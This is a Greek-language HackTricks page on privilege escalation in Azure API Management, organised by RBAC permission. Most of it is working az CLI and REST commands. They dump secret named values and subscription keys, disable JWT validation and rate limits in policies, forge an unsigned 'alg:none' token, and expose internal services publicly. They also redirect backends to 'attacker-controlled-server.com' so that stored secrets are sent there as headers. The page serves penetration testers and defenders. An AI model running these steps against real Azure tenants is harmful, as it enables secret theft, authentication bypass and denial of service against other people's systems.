# Az - API Management Privesc

{{#include ../../../banners/hacktricks-training.md}}

## `Microsoft.ApiManagement/service/namedValues/read` & `Microsoft.ApiManagement/service/namedValues/listValue/action`

Η επίθεση αφορά την πρόσβαση σε ευαίσθητα μυστικά που αποθηκεύονται σε Azure API Management Named Values, είτε με την άμεση ανάκτηση των τιμών των μυστικών είτε με την κατάχρηση δικαιωμάτων για την απόκτηση Key Vault–backed secrets μέσω managed identities.
```bash
az apim nv show-secret --resource-group <resource-group> --service-name <service-name> --named-value-id <named-value-id>
```
## `Microsoft.ApiManagement/service/subscriptions/read` & `Microsoft.ApiManagement/service/subscriptions/listSecrets/action`
Για κάθε subscription, ο επιτιθέμενος μπορεί να αποκτήσει τα subscription keys χρησιμοποιώντας το endpoint listSecrets με τη μέθοδο POST:
```bash
az rest --method POST \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/subscriptions/<subscription-sid>/listSecrets?api-version=2024-05-01"
```
Η απάντηση περιλαμβάνει το κύριο κλειδί της συνδρομής (primaryKey) και το δευτερεύον κλειδί (secondaryKey). Με αυτά τα κλειδιά, ο επιτιθέμενος μπορεί να authenticate και να αποκτήσει πρόσβαση στα APIs που δημοσιεύονται μέσω του API Management Gateway:
```bash
curl -H "Ocp-Apim-Subscription-Key: <primary-key-or-secondary-key>" \
https://<service-name>.azure-api.net/<api-path>
```
Ο επιτιθέμενος μπορεί να έχει πρόσβαση σε όλα τα APIs και τα προϊόντα που σχετίζονται με τη συνδρομή. Εάν η συνδρομή έχει πρόσβαση σε ευαίσθητα προϊόντα ή APIs, ο επιτιθέμενος ενδέχεται να αποκτήσει εμπιστευτικές πληροφορίες ή να εκτελέσει μη εξουσιοδοτημένες ενέργειες.

## `Microsoft.ApiManagement/service/policies/write` or `Microsoft.ApiManagement/service/apis/policies/write`

Ο επιτιθέμενος αρχικά ανακτά την τρέχουσα πολιτική του API:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/?api-version=2024-05-01&format=rawxml"
```
Ο επιτιθέμενος μπορεί να τροποποιήσει την πολιτική με πολλούς τρόπους ανάλογα με τους στόχους του. Για παράδειγμα, για να disable authentication, αν η πολιτική περιλαμβάνει JWT token validation, ο επιτιθέμενος μπορεί να αφαιρέσει ή να σχολιάσει εκείνο το τμήμα:
```xml
<policies>
<inbound>
<base />
<!-- JWT validation removed by the attacker -->
<!-- <validate-jwt header-name="Authorization" failed-validation-httpcode="401" >
...
</validate-jwt> -->
</inbound>
<backend>
<base />
</backend>
<outbound>
<base />
</outbound>
<on-error>
<base />
</on-error>
</policies>
```
Για να αφαιρέσει τους rate limiting ελέγχους και να επιτρέψει denial-of-service επιθέσεις, ο επιτιθέμενος μπορεί να αφαιρέσει ή να σχολιάσει τις quota και rate-limit πολιτικές:
```xml
<policies>
<inbound>
<base />
<!-- Rate limiting removed by the attacker -->
<!-- <rate-limit calls="100" renewal-period="60" />
<quota-by-key calls="1000" renewal-period="3600" counter-key="@(context.Subscription.Id)" /> -->
</inbound>
...
</policies>
```
Για να τροποποιήσετε τη διαδρομή του backend και να ανακατευθύνετε την κίνηση σε έναν server που ελέγχεται από τον επιτιθέμενο:
```xml
<policies>
...
<inbound>
<base />
<set-backend-service base-url="https://attacker-controlled-server.com" />
</inbound>
...
</policies>
```
Στη συνέχεια ο επιτιθέμενος εφαρμόζει την τροποποιημένη πολιτική. Το σώμα του αιτήματος πρέπει να είναι ένα αντικείμενο JSON που περιέχει την πολιτική σε μορφή XML:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/policy?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"format": "rawxml",
"value": "<policies><inbound><base /></inbound><backend><base /></backend><outbound><base /></outbound><on-error><base /></on-error></policies>"
}
}'
```
## Λανθασμένη διαμόρφωση επαλήθευσης JWT

Ο επιτιθέμενος πρέπει να γνωρίζει ότι ένα API χρησιμοποιεί επαλήθευση JWT token και ότι η πολιτική είναι λανθασμένα διαμορφωμένη.

Οι ελλιπώς διαμορφωμένες πολιτικές επαλήθευσης JWT ενδέχεται να έχουν `require-signed-tokens="false"` ή `require-expiration-time="false"`, πράγμα που επιτρέπει στην υπηρεσία να αποδέχεται unsigned tokens ή tokens that never expire.

Ο επιτιθέμενος δημιουργεί ένα κακόβουλο JWT token χρησιμοποιώντας τον none αλγόριθμο (unsigned):
```
# Header: {"alg":"none"}
# Payload: {"sub":"user"}
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0.
```
Ο attacker στέλνει ένα αίτημα στο API χρησιμοποιώντας το malicious token:
```bash
curl -X GET \
-H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0." \
https://<apim>.azure-api.net/path
```
Εάν η πολιτική είναι λανθασμένα ρυθμισμένη με `require-signed-tokens="false"`, η υπηρεσία θα αποδεχθεί το μη υπογεγραμμένο token. Ο επιτιθέμενος μπορεί επίσης να δημιουργήσει ένα token χωρίς expiration claim αν `require-expiration-time="false"`.

## `Microsoft.ApiManagement/service/applynetworkconfigurationupdates/action`
Ο επιτιθέμενος ελέγχει πρώτα την τρέχουσα διαμόρφωση δικτύου της υπηρεσίας:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01"
```
Ο επιτιθέμενος ελέγχει την JSON απάντηση για να επαληθεύσει τις τιμές των `publicNetworkAccess` και `virtualNetworkType`. Αν το `publicNetworkAccess` είναι ορισμένο σε false ή το `virtualNetworkType` είναι ορισμένο σε Internal, η υπηρεσία έχει ρυθμιστεί για ιδιωτική πρόσβαση.

Για να εκθέσει την υπηρεσία στο Διαδίκτυο, ο επιτιθέμενος πρέπει να αλλάξει και τις δύο ρυθμίσεις. Αν η υπηρεσία τρέχει σε εσωτερική λειτουργία (`virtualNetworkType: "Internal"`), ο επιτιθέμενος την αλλάζει σε None ή External και ενεργοποιεί το `publicNetworkAccess`. Αυτό μπορεί να γίνει χρησιμοποιώντας το Azure Management API:
```bash
az rest --method PATCH \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"publicNetworkAccess": "Enabled",
"virtualNetworkType": "None"
}
}'
```
Μόλις το `virtualNetworkType` οριστεί σε `None` ή `External` και το `publicNetworkAccess` είναι ενεργοποιημένο, η υπηρεσία και όλα τα APIs της γίνονται προσβάσιμα από το Internet, ακόμη κι αν προηγουμένως προστατεύονταν πίσω από ιδιωτικό δίκτυο ή private endpoints.

## `Microsoft.ApiManagement/service/backends/write`
Ο επιτιθέμενος αρχικά απαριθμεί τα υπάρχοντα backends για να εντοπίσει ποιο να τροποποιήσει:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends?api-version=2024-05-01"
```
Ο επιτιθέμενος ανακτά την τρέχουσα διαμόρφωση του backend που θέλει να τροποποιήσει:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01"
```
Ο επιτιθέμενος τροποποιεί το backend URL ώστε να δείχνει σε server υπό τον έλεγχό του. Πρώτα λαμβάνει το ETag από την προηγούμενη απάντηση και στη συνέχεια ενημερώνει το backend:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"description": "Backend modified by attacker"
}
}'
```
Εναλλακτικά, ο επιτιθέμενος μπορεί να διαμορφώσει τα backend headers για να exfiltrate Named Values που περιέχουν μυστικά. Αυτό γίνεται μέσω της backend credentials configuration:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"credentials": {
"header": {
"X-Secret-Value": ["{{named-value-secret}}"]
}
}
}
}'
```
Με αυτή τη διαμόρφωση, οι Named Values αποστέλλονται ως headers σε όλα τα requests προς τον attacker-controlled backend, επιτρέποντας την exfiltration ευαίσθητων secrets.

{{#include ../../../banners/hacktricks-training.md}}
